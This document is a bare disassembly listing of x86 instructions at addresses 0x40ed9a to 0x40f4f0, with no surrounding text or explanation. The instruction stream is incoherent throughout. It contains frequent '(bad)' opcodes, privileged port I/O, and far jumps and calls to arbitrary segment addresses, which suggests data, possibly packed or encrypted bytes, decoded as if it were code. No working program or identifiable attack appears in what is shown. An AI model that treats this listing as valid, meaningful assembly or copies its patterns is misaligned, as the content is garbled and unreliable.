  40ed9a:	pusha  
  40ed9b:	or     eax,0x230e2d93
  40eda0:	mov    esi,0xf8f10aa3
  40eda5:	pop    edx
  40eda7:	popa   
  40eda8:	mov    bh,bh
  40edaa:	adc    eax,0xa93b2e6e
  40edaf:	cmp    edx,edx
  40edb1:	jle    0x40ed54
  40edb3:	fdiv   QWORD PTR [ebp+0x7c]
  40edb6:	ror    DWORD PTR [ebx-0x55b46192],cl
  40edbc:	push   esi
  40edbd:	addr16 mov eax,0x32f5f56c
  40edc3:	outs   dx,DWORD PTR ds:[esi]
  40edc4:	xchg   ebp,eax
  40edc5:	xchg   ah,dh
  40edc7:	sub    BYTE PTR [eax],al
  40edc9:	jge    0x40ede5
  40edcb:	je     0x40edbf
  40edcd:	mov    BYTE PTR [edx+0xaef38d8],ah
  40edd3:	mov    dl,0xcb
  40edd5:	rcl    DWORD PTR [eax+0x6a264e5b],cl
  40eddb:	pop    ebx
  40eddc:	rcl    DWORD PTR [edx-0x20],0x2c
  40ede0:	sar    BYTE PTR [ebx+0x2f],cl
  40ede3:	add    ebp,0x29
  40ede6:	jae    0x40ee61
  40ede8:	add    edx,DWORD PTR [edi+eiz*1-0x5a]
  40edec:	push   ss
  40eded:	mov    edx,0x8eb962ba
  40edf2:	shl    BYTE PTR [ecx],1
  40edf4:	retf   0xfe99
  40edf7:	inc    esi
  40edf8:	call   0xd32948b7
  40edfd:	sbb    al,0x7
  40edff:	adc    eax,0x407228cb
  40ee04:	and    DWORD PTR [eax],ecx
  40ee06:	xchg   esi,eax
  40ee07:	dec    edi
  40ee08:	js     0x40ee5d
  40ee0a:	outs   dx,DWORD PTR ds:[esi]
  40ee0b:	mov    ds:0xc16e1019,al
  40ee10:	jg     0x40ee20
  40ee12:	scas   eax,DWORD PTR es:[edi]
  40ee13:	add    eax,0x76c14be3
  40ee18:	xchg   edx,eax
  40ee19:	sbb    eax,ecx
  40ee1b:	sahf   
  40ee1c:	adc    eax,edi
  40ee1e:	xlat   BYTE PTR ds:[ebx]
  40ee1f:	add    bh,0xbf
  40ee22:	pop    ecx
  40ee23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee24:	xchg   BYTE PTR [ecx],al
  40ee26:	inc    edx
  40ee27:	cwde   
  40ee28:	jmp    DWORD PTR ds:0x3c45dc1e
  40ee2e:	sub    BYTE PTR [edi-0x29],dl
  40ee31:	adc    eax,0x21d52b87
  40ee36:	ds or  eax,edi
  40ee39:	fmul   DWORD PTR [esp+ecx*4]
  40ee3c:	mov    edx,0x19411ab0
  40ee41:	mov    ecx,0xdd497237
  40ee46:	inc    BYTE PTR [edi+0x6d]
  40ee49:	cdq    
  40ee4a:	jae    0x40ee50
  40ee4c:	int    0x4
  40ee4e:	cmp    ecx,DWORD PTR [edi+0xa8840a5]
  40ee54:	ins    BYTE PTR es:[edi],dx
  40ee55:	(bad)  
  40ee56:	(bad)
  40ee5b:	mov    ah,0xc2
  40ee5d:	jmp    0x5eec:0xe751ba1e
  40ee64:	push   ebp
  40ee65:	enter  0xe05a,0xfd
  40ee69:	cwde   
  40ee6a:	arpl   WORD PTR [edi+edx*8-0x44ed1373],si
  40ee71:	and    DWORD PTR [ecx-0x5f1aa48a],ebx
  40ee77:	mov    BYTE PTR [ecx-0x61],cl
  40ee7a:	push   ecx
  40ee7b:	jmp    0xe8c64858
  40ee80:	(bad)  
  40ee81:	pop    ds
  40ee82:	fnsave [edx-0x63]
  40ee85:	adc    eax,0xbc1c7539
  40ee8a:	sub    BYTE PTR [edx+0x723cbe4f],ch
  40ee90:	outs   dx,DWORD PTR ds:[esi]
  40ee91:	mov    ds:0x75bd17df,al
  40ee96:	xor    DWORD PTR [ebx],ebx
  40ee98:	adc    ch,BYTE PTR [edx+edx*4]
  40ee9b:	sti    
  40ee9c:	xor    BYTE PTR [edi-0x54],ch
  40ee9f:	mov    al,0xb
  40eea1:	imul   ebx,DWORD PTR [edx],0x2b532879
  40eea7:	shl    esi,cl
  40eea9:	outs   dx,BYTE PTR ds:[esi]
  40eeaa:	sub    al,0x46
  40eeac:	std    
  40eead:	mov    ch,0xdf
  40eeaf:	and    eax,0x3a9f1b35
  40eeb4:	mov    ebp,0xb4c997bb
  40eeb9:	mov    edx,0x8480cef6
  40eebe:	mov    WORD PTR [esi],cs
  40eec0:	xor    eax,0x17ccf71a
  40eec5:	xor    eax,0xb26e2639
  40eeca:	addr16 sbb al,0x33
  40eecd:	add    DWORD PTR [esi-0x754afe93],edx
  40eed3:	inc    BYTE PTR [ebx+0x50]
  40eed6:	jmp    0x207d:0x9f6f8532
  40eedd:	fwait
  40eede:	loopne 0x40eeb2
  40eee0:	mov    esp,0x5a6666b
  40eee5:	scas   eax,DWORD PTR es:[edi]
  40eee6:	jo     0x40ef19
  40eee8:	mov    ecx,esp
  40eeea:	cli    
  40eeeb:	push   ebx
  40eeec:	mov    cl,0x75
  40eeee:	ja     0x40ee96
  40eef0:	call   ecx
  40eef2:	xor    ebp,DWORD PTR [ebp-0x6dcf940c]
  40eef8:	clc    
  40eef9:	pop    edx
  40eefa:	xchg   ecx,eax
  40eefb:	lds    ebp,FWORD PTR [edi+edx*8+0x29]
  40eeff:	(bad)  
  40ef00:	stc    
  40ef01:	adc    dl,BYTE PTR [ecx+0x5f242074]
  40ef07:	dec    edx
  40ef08:	sub    DWORD PTR [ebx-0x24],0xffffffaf
  40ef0c:	repnz stos BYTE PTR es:[edi],al
  40ef0e:	into   
  40ef0f:	inc    ecx
  40ef10:	xchg   esp,eax
  40ef11:	mov    dl,0xcb
  40ef13:	jb     0x40ef56
  40ef15:	cld    
  40ef16:	aam    0x69
  40ef18:	hlt    
  40ef19:	ins    BYTE PTR es:[edi],dx
  40ef1a:	push   cs
  40ef1b:	(bad)  
  40ef1c:	call   ebp
  40ef1e:	fstp   DWORD PTR [ebp-0x7f6fd4a2]
  40ef24:	ret    
  40ef25:	hlt    
  40ef26:	or     BYTE PTR [ebx-0x77],cl
  40ef29:	xchg   ecx,eax
  40ef2a:	lock shl cl,1
  40ef2d:	fisttp QWORD PTR [edx+0x12]
  40ef30:	dec    ebx
  40ef31:	jle    0x40ef8a
  40ef33:	icebp  
  40ef34:	sub    bl,ah
  40ef36:	xor    BYTE PTR [esi],dh
  40ef38:	das    
  40ef39:	(bad)  
  40ef3a:	lods   eax,DWORD PTR ds:[esi]
  40ef3b:	mov    WORD PTR [esi+ebx*8],ss
  40ef3e:	mov    WORD PTR [ebx-0x10],gs
  40ef41:	push   ds
  40ef42:	ss xchg ebx,eax
  40ef44:	push   cs
  40ef45:	sbb    al,al
  40ef47:	shr    BYTE PTR [edi],cl
  40ef49:	adc    esp,DWORD PTR [ecx+edx*2-0x72]
  40ef4d:	sti    
  40ef4e:	and    eax,DWORD PTR [ebx-0x59fbe14d]
  40ef54:	fwait
  40ef55:	in     al,dx
  40ef56:	gs or  esi,ebx
  40ef59:	(bad)  
  40ef5a:	adc    DWORD PTR [ecx],ecx
  40ef5c:	or     eax,0xd1cd0240
  40ef61:	push   es
  40ef62:	imul   ebp,DWORD PTR [eax],0xdd93481f
  40ef68:	jae    0x40ef4f
  40ef6a:	data16 and BYTE PTR [ebx+0x45],dl
  40ef6e:	leave  
  40ef6f:	push   ebx
  40ef70:	push   ebx
  40ef71:	shl    BYTE PTR [eax+0x6b5717a3],cl
  40ef77:	or     BYTE PTR [eax],0xff
  40ef7a:	jb     0x40ef00
  40ef7c:	adc    al,0xc5
  40ef7e:	sub    DWORD PTR [ecx+0x48],eax
  40ef81:	ins    BYTE PTR es:[edi],dx
  40ef82:	sbb    cl,ch
  40ef84:	mov    esp,0x89561bef
  40ef89:	test   al,0x7d
  40ef8b:	inc    edx
  40ef8c:	xchg   DWORD PTR [ebx-0x21968b3b],edi
  40ef92:	mov    edx,0x9d1f636a
  40ef97:	jnp    0x40f015
  40ef99:	mov    ds:0xa682295d,eax
  40ef9e:	xchg   edi,eax
  40ef9f:	mov    ah,0xf1
  40efa1:	mov    bl,0x36
  40efa3:	jmp    0x3964d120
  40efa8:	das    
  40efa9:	ret    
  40efaa:	pop    edx
  40efab:	(bad)  
  40efac:	(bad)  
  40efad:	mov    edi,0x301d36dc
  40efb2:	fs (bad) 
  40efb4:	imul   ebp,DWORD PTR [ecx-0x720b14b9],0x18
  40efbb:	push   es
  40efbc:	dec    eax
  40efbd:	push   0x71
  40efbf:	push   es
  40efc0:	pusha  
  40efc1:	lods   eax,DWORD PTR ds:[esi]
  40efc2:	inc    ebx
  40efc3:	jb     0x40ef6f
  40efc5:	and    al,0xb1
  40efc7:	test   edx,ebx
  40efc9:	es jne 0x40f02f
  40efcc:	mov    dl,0x7
  40efce:	inc    ebx
  40efcf:	push   esi
  40efd0:	sub    BYTE PTR [ecx-0x4c],cl
  40efd3:	popf   
  40efd4:	rol    edx,cl
  40efd6:	(bad)  
  40efd7:	aam    0x95
  40efd9:	hlt    
  40efda:	pop    ebp
  40efdb:	das    
  40efdc:	sub    al,0x83
  40efde:	sbb    eax,0x7f204054
  40efe3:	add    al,0x60
  40efe5:	popf   
  40efe6:	cmp    ch,BYTE PTR [edi]
  40efe8:	fild   WORD PTR [eax]
  40efea:	fucom  st(7)
  40efec:	out    dx,eax
  40efed:	(bad)  
  40efee:	call   0xf016d482
  40eff3:	(bad)  
  40eff4:	cmp    edi,eax
  40eff6:	xchg   ebx,eax
  40eff7:	std    
  40eff8:	inc    eax
  40eff9:	add    esi,DWORD PTR [ecx-0x48a93392]
  40efff:	repz test al,0x51
  40f002:	retf   
  40f003:	and    eax,0x2702141c
  40f008:	fs mov al,0x46
  40f00b:	adc    DWORD PTR [ebp-0x6f5ad47a],ecx
  40f011:	sbb    ah,BYTE PTR [edi+0x17]
  40f014:	pop    edi
  40f015:	aad    0x6a
  40f017:	add    ax,0x8928
  40f01b:	lds    ebx,FWORD PTR [eax]
  40f01d:	int3   
  40f01e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f01f:	pop    es
  40f020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f021:	sub    bl,BYTE PTR [esi]
  40f023:	daa    
  40f024:	push   edx
  40f025:	jmp    0x1daf:0xfd86f659
  40f02c:	dec    ebx
  40f02d:	adc    BYTE PTR [ecx+0x3aa0e0b8],cl
  40f033:	mov    ch,0x99
  40f035:	rcr    DWORD PTR [ebx],0xd9
  40f038:	mov    edx,0xc79e988f
  40f03d:	pop    ebx
  40f03e:	mov    ch,0xaa
  40f040:	mov    ch,0xd7
  40f042:	or     al,0x9
  40f044:	mov    bl,0x36
  40f046:	mov    dh,ch
  40f048:	xchg   BYTE PTR [esi],bh
  40f04a:	pop    esp
  40f04b:	aas    
  40f04c:	cs push eax
  40f04e:	fstp   QWORD PTR [edi-0x1]
  40f051:	test   al,0xec
  40f053:	dec    eax
  40f054:	stos   BYTE PTR es:[edi],al
  40f055:	test   eax,0xa5abe885
  40f05a:	mov    al,0x45
  40f05c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f05d:	retf   
  40f05e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f05f:	xchg   dh,ah
  40f061:	sub    esp,ebp
  40f063:	leave  
  40f064:	scas   al,BYTE PTR es:[edi]
  40f065:	push   esp
  40f066:	adc    BYTE PTR [edx],ch
  40f068:	repnz cmp esp,DWORD PTR [eax-0x79571e1a]
  40f06f:	fld    DWORD PTR [eax]
  40f071:	scas   eax,DWORD PTR es:[edi]
  40f072:	cmp    ebx,DWORD PTR ds:0xd326245c
  40f078:	add    esp,0xffffffd3
  40f07b:	mov    DWORD PTR [edi-0x7d],ebx
  40f07e:	push   es
  40f07f:	cmp    BYTE PTR [eax+edx*2],ch
  40f082:	push   ds
  40f083:	addr16 xor ebp,esi
  40f086:	popa   
  40f087:	xor    eax,DWORD PTR [edi-0x4]
  40f08a:	call   0xd353e165
  40f08f:	xor    BYTE PTR ds:0xa02b4d5d,dh
  40f095:	repz not DWORD PTR [eax]
  40f098:	mov    eax,0xa79d8b91
  40f09d:	js     0x40f078
  40f09f:	sti    
  40f0a0:	fimul  WORD PTR es:[eax]
  40f0a3:	loopne 0x40f066
  40f0a5:	in     eax,0x1c
  40f0a7:	popa   
  40f0a8:	sti    
  40f0a9:	in     al,dx
  40f0aa:	stos   DWORD PTR es:[edi],eax
  40f0ab:	push   eax
  40f0ac:	mov    WORD PTR [eax+0x2e],es
  40f0af:	es cld 
  40f0b1:	out    0xc,al
  40f0b3:	call   0xdca4:0xeb167153
  40f0ba:	sub    al,0x8f
  40f0bd:	pop    DWORD PTR [ebp+0x6d]
  40f0c0:	gs in  al,0x40
  40f0c3:	or     DWORD PTR [esi+0x69],ebx
  40f0c6:	push   es
  40f0c7:	ja     0x40f0a8
  40f0c9:	fsub   DWORD PTR [eax]
  40f0cb:	dec    edx
  40f0cc:	mov    esp,0xa0058f4
  40f0d1:	pushf  
  40f0d2:	sbb    al,0x7
  40f0d4:	jmp    0x40f0a3
  40f0d6:	mov    dh,0x47
  40f0d8:	(bad)  
  40f0d9:	sbb    BYTE PTR [ebp+0x6b],dl
  40f0dc:	and    al,0x61
  40f0de:	out    dx,eax
  40f0df:	pop    esi
  40f0e0:	hlt    
  40f0e1:	mov    ds:0x69b4d60f,al
  40f0e6:	retf   0x9720
  40f0e9:	pop    ebx
  40f0ea:	mov    gs,WORD PTR [edi-0xf19c730]
  40f0f0:	push   eax
  40f0f1:	dec    ebx
  40f0f2:	pop    ds
  40f0f3:	scas   al,BYTE PTR es:[edi]
  40f0f4:	jmp    DWORD PTR [esi+0x2a5dba2e]
  40f0fa:	sbb    edx,DWORD PTR [eax+0x749dccb6]
  40f100:	mov    eax,ds:0x79d6d7ba
  40f105:	mov    al,ds:0x9e6e988f
  40f10a:	fimul  WORD PTR [ecx+ecx*8]
  40f10d:	call   0x37d861
  40f112:	loopne 0x40f181
  40f114:	and    bl,BYTE PTR [edi-0x40]
  40f117:	vmulps ymm5,ymm0,YMMWORD PTR [edi]
  40f11b:	lahf   
  40f11c:	or     al,0x1c
  40f11e:	shl    DWORD PTR ds:0x1e741842,cl
  40f124:	mov    esp,0x8dfe8602
  40f129:	xchg   edi,eax
  40f12a:	mov    esi,0x46c3fc58
  40f12f:	cmp    al,0x92
  40f131:	nop
  40f132:	scas   al,BYTE PTR es:[edi]
  40f133:	dec    ebx
  40f134:	inc    DWORD PTR ss:[edx+0x8f28a74]
  40f13b:	jno    0x40f0be
  40f13d:	inc    esi
  40f13e:	adc    eax,0xef67fac0
  40f143:	inc    esi
  40f144:	(bad)  
  40f145:	in     eax,0x21
  40f147:	push   ebp
  40f148:	leave  
  40f149:	pop    ebx
  40f14a:	mov    ebp,0xf42f6b4b
  40f14f:	js     0x40f0da
  40f151:	adc    cl,BYTE PTR [edx-0x4a]
  40f154:	stc    
  40f155:	mov    ebx,0xd9963320
  40f15a:	sub    BYTE PTR ds:0xa9150078,0x51
  40f161:	mov    ch,0x22
  40f163:	je     0x40f142
  40f165:	pop    ds
  40f166:	or     cl,BYTE PTR [ecx+0x52]
  40f169:	test   dh,dh
  40f16b:	dec    edi
  40f16c:	pop    ecx
  40f16d:	int    0x70
  40f16f:	lods   eax,DWORD PTR ds:[esi]
  40f170:	jmp    0x40f171
  40f172:	push   DWORD PTR [eax+0x74b36ab9]
  40f178:	xor    BYTE PTR [edi-0x3061ca7b],dh
  40f17e:	jbe    0x40f1df
  40f180:	rep stos BYTE PTR es:[edi],al
  40f182:	ss das 
  40f184:	mov    esp,0xc4430ef8
  40f189:	and    BYTE PTR [ebx-0x5],0xe4
  40f18d:	stos   BYTE PTR es:[edi],al
  40f18e:	outs   dx,DWORD PTR ds:[esi]
  40f18f:	adc    al,0x5d
  40f191:	and    al,dh
  40f193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f194:	adc    esp,DWORD PTR [ebp-0x71]
  40f197:	and    al,0xb
  40f199:	jbe    0x40f1fc
  40f19b:	fwait
  40f19c:	xlat   BYTE PTR ds:[ebx]
  40f19d:	test   al,0x49
  40f19f:	es je  0x40f12a
  40f1a2:	push   0xffffffe9
  40f1a4:	cld    
  40f1a5:	test   DWORD PTR [eax-0x7b],edi
  40f1a8:	shr    DWORD PTR [esi],0x93
  40f1ab:	cmp    dl,al
  40f1ad:	loope  0x40f13a
  40f1af:	jmp    0x6fe043e6
  40f1b4:	fdiv   DWORD PTR [ecx]
  40f1b6:	and    ecx,esp
  40f1b8:	stc    
  40f1b9:	add    ch,ah
  40f1bb:	pop    ebp
  40f1bc:	push   0xffffffd7
  40f1be:	add    BYTE PTR [edi-0x7b],dh
  40f1c1:	xlat   BYTE PTR ds:[ebx]
  40f1c2:	mov    ebp,0xc1771f37
  40f1c7:	rcl    edx,0xa4
  40f1ca:	mov    cl,0xc0
  40f1cc:	jno    0x40f17e
  40f1ce:	inc    ebx
  40f1cf:	ins    BYTE PTR es:[edi],dx
  40f1d0:	mov    eax,0x45c829f5
  40f1d5:	jns    0x40f214
  40f1d7:	rol    BYTE PTR [eax-0x62bd57d5],cl
  40f1dd:	je     0x40f1f0
  40f1df:	outs   dx,BYTE PTR ds:[esi]
  40f1e0:	scas   al,BYTE PTR es:[edi]
  40f1e1:	adc    BYTE PTR [ecx+0x10f1e060],dl
  40f1e7:	xor    eax,0x66e0f5d7
  40f1ec:	(bad)  
  40f1ed:	fistp  QWORD PTR [esi+esi*4+0x70d881a3]
  40f1f4:	or     edi,DWORD PTR [ecx+0x31]
  40f1f7:	(bad)  
  40f1f8:	pop    ecx
  40f1f9:	cld    
  40f1fa:	xchg   ebx,eax
  40f1fb:	into   
  40f1fc:	or     edi,DWORD PTR [edi+edi*2-0x52]
  40f200:	into   
  40f201:	lods   eax,DWORD PTR ds:[esi]
  40f202:	mov    DWORD PTR [ebx+0x24333746],esi
  40f208:	jecxz  0x40f1b6
  40f20a:	enter  0x812e,0xed
  40f20e:	or     edx,DWORD PTR [eax]
  40f210:	cmp    esi,DWORD PTR [ebp+0x6c]
  40f213:	push   eax
  40f214:	dec    ebp
  40f215:	xor    esp,edi
  40f217:	inc    ecx
  40f218:	int    0xae
  40f21a:	add    dh,BYTE PTR [ebp-0x392f6c8b]
  40f220:	mov    ah,0xc5
  40f222:	dec    ecx
  40f223:	add    ebx,DWORD PTR [eax+0x76]
  40f226:	(bad)  
  40f227:	fisttp DWORD PTR [esi+edx*4]
  40f22a:	les    ebp,FWORD PTR [ebx]
  40f22c:	sti    
  40f22d:	jmp    0xe799cb52
  40f232:	stos   BYTE PTR es:[edi],al
  40f233:	push   eax
  40f234:	aad    0x22
  40f236:	iret   
  40f237:	push   0x857d8cb9
  40f23c:	xchg   ebx,eax
  40f23d:	jne    0x40f2bc
  40f23f:	cmp    ch,BYTE PTR [esi+0x7f08a4e9]
  40f245:	jl     0x40f213
  40f247:	inc    ebp
  40f248:	push   ecx
  40f249:	test   al,0x20
  40f24c:	or     edi,DWORD PTR [eax-0x77c380c2]
  40f252:	in     eax,0xea
  40f254:	mov    edx,0xbd150f49
  40f259:	adc    eax,0xb29b069a
  40f25e:	stos   BYTE PTR es:[edi],al
  40f25f:	xor    al,0x2f
  40f261:	repz pop edi
  40f263:	jmp    0x2f6a4a78
  40f268:	mov    gs,WORD PTR [ecx+0x61]
  40f26b:	inc    ebp
  40f26c:	sbb    BYTE PTR [edx],cl
  40f26e:	sub    eax,0x5779d3ac
  40f273:	imul   ecx,DWORD PTR [edx],0xd73db2d0
  40f279:	rcr    DWORD PTR [ebp-0x23],1
  40f27c:	inc    eax
  40f27d:	lock xchg esp,eax
  40f27f:	dec    ebx
  40f280:	fist   DWORD PTR ds:0xd0e145bc
  40f286:	push   ss
  40f287:	retf   
  40f288:	outs   dx,DWORD PTR ds:[esi]
  40f289:	out    dx,eax
  40f28a:	mov    bl,0x66
  40f28c:	scas   eax,DWORD PTR es:[edi]
  40f28d:	inc    eax
  40f28e:	pusha  
  40f28f:	add    BYTE PTR [ebp-0x8fe7d15],ah
  40f295:	jno    0x40f289
  40f297:	sub    dh,bl
  40f299:	mov    dl,0xc3
  40f29b:	inc    edx
  40f29c:	and    BYTE PTR [esp+ebx*8],0x59
  40f2a0:	push   ebp
  40f2a1:	int    0xc0
  40f2a3:	xor    edi,0xffffff83
  40f2a6:	retf   0x56ac
  40f2a9:	ss into 
  40f2ab:	enter  0x3760,0xe3
  40f2af:	xchg   esi,eax
  40f2b0:	sub    bl,bh
  40f2b2:	int3   
  40f2b3:	jge    0x40f315
  40f2b5:	xor    ch,BYTE PTR [ebx]
  40f2b7:	sub    BYTE PTR [edi+0x40],ch
  40f2ba:	jmp    DWORD PTR [eax]
  40f2bd:	aas    
  40f2be:	jp     0x40f28d
  40f2c0:	push   esi
  40f2c1:	sub    eax,ecx
  40f2c3:	mov    bh,0x95
  40f2c5:	push   cs
  40f2c6:	xchg   BYTE PTR [esi+0x7efe9878],al
  40f2cc:	test   BYTE PTR [edi+0x35c57e8b],dh
  40f2d2:	addr16 add ebx,ebx
  40f2d5:	or     dh,BYTE PTR [esp+esi*4]
  40f2d8:	aad    0xb1
  40f2da:	inc    ebp
  40f2db:	icebp  
  40f2dc:	daa    
  40f2dd:	pop    ebp
  40f2de:	addr16 (bad) 
  40f2e0:	sub    al,0x36
  40f2e2:	jmp    0xf1edb09b
  40f2e7:	sub    BYTE PTR [edx-0x74],dh
  40f2ea:	in     eax,0xb8
  40f2ec:	and    al,0xe6
  40f2ee:	inc    edi
  40f2ef:	and    dl,BYTE PTR [eax-0x24]
  40f2f2:	data16 mov bh,0xd
  40f2f5:	adc    ah,BYTE PTR [ecx]
  40f2f7:	xchg   DWORD PTR [ebp-0x1f],esi
  40f2fa:	xchg   DWORD PTR [eax],esi
  40f2fc:	adc    ch,BYTE PTR [ebx+edi*8+0x773a7a30]
  40f303:	push   eax
  40f304:	jp     0x40f2d2
  40f306:	pop    ss
  40f307:	test   eax,0xdc95377b
  40f30c:	sahf   
  40f30d:	mov    ecx,ebp
  40f30f:	pop    es
  40f310:	jb     0x40f333
  40f312:	sbb    DWORD PTR [ebx+0x37],eax
  40f315:	add    DWORD PTR [ecx+0x6f9176a3],0xffffff9a
  40f31c:	cmp    ah,BYTE PTR [eax-0x18]
  40f31f:	cmc    
  40f320:	call   0x3d7f:0x87f771af
  40f327:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f328:	rcr    DWORD PTR [ebx-0x5a8742ae],1
  40f32e:	test   BYTE PTR ds:0xf6deb0f2,0x54
  40f335:	jmp    0x8c47:0x6644d650
  40f33c:	cmp    BYTE PTR [esi],0xcb
  40f33f:	outs   dx,BYTE PTR ds:[esi]
  40f340:	add    al,al
  40f342:	jg     0x40f336
  40f344:	call   0xdc42:0xd24a0cc0
  40f34b:	sahf   
  40f34c:	pop    ebx
  40f34d:	jl     0x40f32a
  40f34f:	and    eax,0x2aa05f2e
  40f354:	xchg   ecx,eax
  40f355:	add    edx,edx
  40f357:	stos   DWORD PTR es:[edi],eax
  40f358:	lock cmp al,BYTE PTR [esi]
  40f35b:	dec    esp
  40f35c:	fsubr  QWORD PTR [edx]
  40f35e:	or     al,0xad
  40f360:	push   cs
  40f361:	xchg   esi,eax
  40f362:	leave  
  40f363:	cli    
  40f364:	and    eax,0x33fd14e5
  40f369:	les    esi,FWORD PTR [esi-0x7139be75]
  40f36f:	pop    eax
  40f370:	sbb    esp,eax
  40f372:	movd   mm5,eax
  40f375:	jmp    0x40f3d8
  40f377:	leave  
  40f378:	cmp    ebx,DWORD PTR [eax]
  40f37a:	cmp    al,BYTE PTR [eax+0x5d]
  40f37d:	outs   dx,BYTE PTR ds:[esi]
  40f37e:	in     al,0xf6
  40f380:	out    0x92,eax
  40f382:	sub    cl,bh
  40f384:	sbb    ebp,DWORD PTR [eax+0x5654ea35]
  40f38a:	ror    DWORD PTR [edx-0x43],0x88
  40f38e:	shl    BYTE PTR [ebx+0x393dd3d2],0x8b
  40f395:	fldcw  WORD PTR [ecx-0x51]
  40f398:	cmp    DWORD PTR [edx],0x1b355535
  40f39e:	cmp    dh,BYTE PTR [edi]
  40f3a0:	jle    0x40f36b
  40f3a2:	addr16 jle 0x40f3ad
  40f3a5:	in     al,dx
  40f3a6:	add    ch,dh
  40f3a8:	ror    esp,0xbb
  40f3ab:	push   ss
  40f3ac:	xor    bh,BYTE PTR [ecx-0x6952093]
  40f3b2:	dec    esp
  40f3b3:	fs inc edx
  40f3b5:	xchg   ebp,eax
  40f3b6:	into   
  40f3b7:	or     eax,0xa65a805c
  40f3bc:	pop    edx
  40f3bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3be:	jnp    0x40f3f2
  40f3c0:	dec    eax
  40f3c1:	ins    BYTE PTR es:[edi],dx
  40f3c2:	int    0x3d
  40f3c4:	pushf  
  40f3c5:	mov    cs,ebx
  40f3c7:	lds    esp,FWORD PTR [ebx]
  40f3c9:	(bad)
  40f3cd:	xchg   ebx,eax
  40f3ce:	addr16 in eax,0x7f
  40f3d1:	inc    ebx
  40f3d2:	push   ebp
  40f3d3:	retf   0x6ba3
  40f3d6:	arpl   WORD PTR [edx],bp
  40f3d8:	sbb    al,0xfc
  40f3da:	mov    al,ds:0x75d8f97c
  40f3df:	mov    esi,0x43e6b323
  40f3e4:	jp     0x40f382
  40f3e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3e7:	add    al,0x57
  40f3e9:	in     al,0xfe
  40f3eb:	mov    eax,0x47692e2d
  40f3f0:	les    esi,FWORD PTR [eax-0x249a68a8]
  40f3f6:	leave  
  40f3f7:	mov    al,ds:0xb5bf7fae
  40f3fc:	arpl   WORD PTR [edi-0x2a],ax
  40f3ff:	sub    al,0xc6
  40f401:	sub    DWORD PTR [edx+0x72],0xc47b3cbe
  40f408:	scas   eax,DWORD PTR es:[edi]
  40f409:	pop    esi
  40f40a:	stc    
  40f40b:	push   esi
  40f40c:	mov    ss,ecx
  40f40e:	aad    0x47
  40f410:	or     eax,0x585f474c
  40f415:	and    ah,dl
  40f417:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f419:	inc    esp
  40f41a:	dec    eax
  40f41b:	jb     0x40f3da
  40f41d:	push   edi
  40f41e:	mov    BYTE PTR [edi],ah
  40f420:	add    al,0xf2
  40f422:	jmp    0x4f67:0xee13e727
  40f429:	sub    eax,edi
  40f42b:	test   BYTE PTR [ecx+0x8],bh
  40f42e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f42f:	inc    esp
  40f430:	jmp    0xa8798177
  40f435:	push   ebx
  40f436:	mov    dh,0xf2
  40f438:	mov    edx,0x2ab9bd1d
  40f43d:	push   ds
  40f43e:	pop    edx
  40f43f:	scas   eax,DWORD PTR es:[edi]
  40f440:	mov    dh,0xe1
  40f442:	mov    esp,0x82d56f53
  40f447:	into   
  40f448:	cdq    
  40f449:	dec    esi
  40f44a:	push   edi
  40f44b:	jecxz  0x40f4c9
  40f44d:	call   0x4ce7:0x6dc0fa0
  40f454:	jp     0x40f41d
  40f456:	je     0x40f45b
  40f458:	loop   0x40f48c
  40f45a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f45b:	pop    ecx
  40f45c:	mov    ebx,0x2d3e2cff
  40f461:	gs ja  0x40f4c9
  40f464:	stos   BYTE PTR es:[edi],al
  40f465:	inc    ecx
  40f466:	xchg   edi,eax
  40f467:	fidivr WORD PTR [edx]
  40f469:	loopne 0x40f4c5
  40f46b:	popa   
  40f46c:	cdq    
  40f46d:	out    dx,eax
  40f46e:	pop    edi
  40f46f:	adc    ecx,esp
  40f471:	das    
  40f472:	dec    esi
  40f473:	mov    ecx,0x74d09be7
  40f478:	inc    edx
  40f479:	or     ebp,DWORD PTR [edx]
  40f47b:	iret   
  40f47c:	xor    ebx,DWORD PTR [ebx+0x1e]
  40f47f:	fdiv   DWORD PTR [ebp+0x25]
  40f482:	xchg   ebx,eax
  40f483:	add    ecx,DWORD PTR [ecx]
  40f485:	fisttp QWORD PTR [ecx+esi*1]
  40f488:	rcl    BYTE PTR [edx],1
  40f48a:	out    0xae,eax
  40f48c:	sub    ebx,DWORD PTR [edx+eiz*4+0x78]
  40f490:	aaa    
  40f491:	jle    0x40f462
  40f493:	mov    al,ds:0xa066dca9
  40f498:	rcr    BYTE PTR [ecx-0x3b],1
  40f49b:	rcr    bh,0xbe
  40f49e:	inc    ecx
  40f49f:	ficomp WORD PTR [ebx+eiz*4]
  40f4a2:	in     al,0x68
  40f4a4:	sbb    BYTE PTR ds:0x3aac4997,ch
  40f4aa:	cli    
  40f4ab:	push   esi
  40f4ac:	shr    BYTE PTR [ecx-0x47],cl
  40f4af:	sub    BYTE PTR [edi],dl
  40f4b1:	and    eax,0x891de635
  40f4b6:	jae    0x40f4d3
  40f4b8:	dec    eax
  40f4b9:	cmc    
  40f4ba:	into   
  40f4bb:	stc    
  40f4bc:	xchg   BYTE PTR [eax+0x53ae01ac],bh
  40f4c2:	pop    esi
  40f4c3:	stos   DWORD PTR es:[edi],eax
  40f4c4:	adc    edx,0xe7c8675f
  40f4ca:	fistp  WORD PTR [ebp+0x691decd6]
  40f4d0:	jbe    0x40f47b
  40f4d2:	je     0x40f495
  40f4d4:	std    
  40f4d5:	lds    edx,FWORD PTR [ebp-0x196912ac]
  40f4db:	int    0xe1
  40f4dd:	jle    0x40f541
  40f4df:	push   es
  40f4e0:	dec    edx
  40f4e1:	sar    BYTE PTR [esi],cl
  40f4e3:	sub    bh,0x9
  40f4e6:	test   BYTE PTR [ebp+0x60],cl
  40f4e9:	jmp    0xe042:0x6b33e3ca
  40f4f0:	popf   
